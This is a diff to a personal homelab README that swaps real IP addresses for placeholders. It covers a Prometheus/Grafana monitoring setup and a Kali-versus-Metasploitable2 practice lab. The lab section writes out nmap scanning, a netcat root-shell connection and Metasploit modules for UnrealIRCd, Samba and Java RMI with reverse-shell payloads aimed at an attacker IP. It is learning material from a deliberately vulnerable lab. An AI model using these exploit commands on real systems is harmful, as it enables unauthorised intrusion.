@@ -1,8 +1,6 @@
-# homelab-cybersec
+# Homelab & Cybersecurity Lab - Build Report
 
-# 🖥️ Homelab & Cybersecurity Lab — Build Report
-
-> A documentation of my homelab journey — from setting up a monitoring stack on an old laptop to performing real penetration testing exploits in a personal cybersecurity lab.
+> A documentation of my homelab journey - from setting up a monitoring stack on an old laptop to performing real penetration testing exploits in a personal cybersecurity lab.
 
 ---
 
@@ -100,20 +98,20 @@ curl localhost:9100/metrics | head
 
 **Directory:** `~/monitoring/prometheus`
 
-**Key issue resolved:** Using `localhost` as a scrape target failed due to Docker network namespace isolation. Fixed by using the actual LAN IP `192.168.0.182` as the target.
+**Key issue resolved:** Using `localhost` as a scrape target failed due to Docker network namespace isolation. Fixed by using the actual LAN IP of the server as the target.
 
 ```yaml
 scrape_configs:
   - job_name: "node"
     static_configs:
-      - targets: ["192.168.0.182:9100"]
+      - targets: ["<server-ip>:9100"]
 
   - job_name: "cadvisor"
     static_configs:
-      - targets: ["192.168.0.182:8081"]
+      - targets: ["<server-ip>:8081"]
 ```
 
-**Access:** `http://192.168.0.182:9090`
+**Access:** `http://<server-ip>:9090`
 
 ---
 
@@ -128,7 +126,7 @@ scrape_configs:
 - cAdvisor Exporter (ID: 14282) — container metrics
 - Logs / App — Loki log viewer
 
-**Access:** `http://192.168.0.182:3000`
+**Access:** `http://<server-ip>:3000`
 
 **Key issue resolved:** Dashboard import via ID failed with "Bad Gateway" because Grafana couldn't reach grafana.com. Fixed by downloading the JSON manually and importing via the Grafana API using a Python script.
 
@@ -169,18 +167,18 @@ curl -fsSL https://tailscale.com/install.sh | sh
 sudo tailscale up
 ```
 
-**Tailscale IP assigned:** `100.86.24.2`
+**Tailscale IP assigned:** `100.x.x.x` (unique per user)
 
 All homelab services are now accessible remotely via the Tailscale IP:
 
 | Service | URL |
 |---|---|
-| Grafana | `http://100.86.24.2:3000` |
-| Prometheus | `http://100.86.24.2:9090` |
-| Pi-hole | `http://100.86.24.2/admin` |
-| Loki | `http://100.86.24.2:3100` |
-| Open WebUI | `http://100.86.24.2:8080` |
-| cAdvisor | `http://100.86.24.2:8081` |
+| Grafana | `http://<tailscale-ip>:3000` |
+| Prometheus | `http://<tailscale-ip>:9090` |
+| Pi-hole | `http://<tailscale-ip>/admin` |
+| Loki | `http://<tailscale-ip>:3100` |
+| Open WebUI | `http://<tailscale-ip>:8080` |
+| cAdvisor | `http://<tailscale-ip>:8081` |
 
 ---
 
@@ -213,7 +211,7 @@ services:
 - Docker and Linux config help
 - General cybersecurity learning
 
-**Access:** `http://192.168.0.182:8080`
+**Access:** `http://<server-ip>:8080`
 
 **Note:** Running LLMs on CPU generates significant heat on older hardware. Recommended to start Ollama on-demand rather than keeping it running 24/7.
 
@@ -254,7 +252,7 @@ cAdvisor → Prometheus → Grafana
 ┌─────────────────────┐         ┌─────────────────────┐
 │   Personal Laptop   │         │        PC           │
 │   Kali Linux (VM)   │─attacks→│ Metasploitable2 (VM)│
-│   192.168.0.158     │         │   192.168.0.189     │
+│   192.168.x.x       │         │   192.168.x.x       │
 └─────────────────────┘         └─────────────────────┘
            │                              │
            └──────────────┬───────────────┘
@@ -277,7 +275,7 @@ cAdvisor → Prometheus → Grafana
 **Tool:** Nmap
 
 ```bash
-nmap -sV 192.168.0.189
+nmap -sV <target-ip>
 ```
 
 **Results — open ports discovered:**
@@ -306,7 +304,7 @@ nmap -sV 192.168.0.189
 Port 1524 had an unauthenticated root shell listening — no exploit required, just a direct netcat connection.
 
 ```bash
-nc 192.168.0.189 1524
+nc <target-ip> 1524
 whoami
 # root
 ```
@@ -321,9 +319,9 @@ UnrealIRCd 3.2.8.1 contained a backdoor secretly inserted into its source code b
 
 ```bash
 use exploit/unix/irc/unreal_ircd_3281_backdoor
-set RHOSTS 192.168.0.189
+set RHOSTS <target-ip>
 set PAYLOAD cmd/unix/reverse
-set LHOST 192.168.0.158
+set LHOST <attacker-ip>
 run
 ```
 
@@ -339,9 +337,9 @@ A vulnerability in Samba's MS-RPC functionality allowed unauthenticated remote c
 
 ```bash
 use exploit/multi/samba/usermap_script
-set RHOSTS 192.168.0.189
+set RHOSTS <target-ip>
 set PAYLOAD cmd/unix/reverse
-set LHOST 192.168.0.158
+set LHOST <attacker-ip>
 run
 # whoami → root
 ```
@@ -357,7 +355,7 @@ Java RMI service exposed on port 1099 allowed code execution via a malicious RMI
 ```bash
 use exploit/multi/misc/java_rmi_server
 set PAYLOAD java/meterpreter/reverse_tcp
-set LHOST 192.168.0.158
+set LHOST <attacker-ip>
 run
 ```
 
